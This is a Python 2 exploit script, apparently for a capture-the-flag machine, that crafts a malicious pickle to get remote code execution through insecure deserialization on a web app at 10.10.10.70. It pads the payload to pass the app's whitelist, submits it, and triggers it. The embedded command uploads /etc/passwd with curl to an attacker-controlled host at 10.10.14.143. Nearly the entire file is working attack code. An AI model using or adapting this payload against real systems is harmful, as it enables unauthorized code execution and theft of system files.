
import pickle, os


cmd = "curl --form 'fileupload=@/etc/passwd' 10.10.14.143:8001"

char = """cposix
system
p0
(S'{};homerp1'
""".format(cmd)

class EvilPickle(object):
    def __reduce__(self):
	return (os.system, ('ping -c 4 10.10.14.143;homerp1', ))
pickle_data1 = pickle.dumps(EvilPickle())
pickle_data = ("\n").join(pickle_data1.split("\n")[4:])
with open("backup.p", "wb") as file:
    print "........................\n"
    print char + pickle_data
    print "------------------------\n"
    file.write(char + pickle_data)
    file.close()

print pickle_data1
print "-------------------------\n"

os.system('dos2unix backup.p')

import sys
from hashlib import md5

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

with open("backup.p", "r") as file2:
	quote = pickle_data#file2.read()
if not char or not quote:
	print "Error 1"
	sys.exit()
elif not any(c.lower() in char.lower() for c in WHITELIST):
	print "Error 2"
	sys.exit()
data = open("backup.p", "rb").read()
if not "p1" in data:
	print "Error 3"
	sys.exit()	

else:
	p_id = md5(char + quote).hexdigest()
        print p_id


import requests

url = "http://10.10.10.70/submit"
data= {
	'character':char,
	'quote':quote
    }
cookies = {}
if "Success" in requests.post(url, data=data, cookies=cookies).text:
	print "Success posting data: {}, {}".format(char, quote)

url = "http://10.10.10.70/check"
data= {
        'id': p_id
    }
cookies = {}
print requests.post(url, data=data, cookies=cookies).text

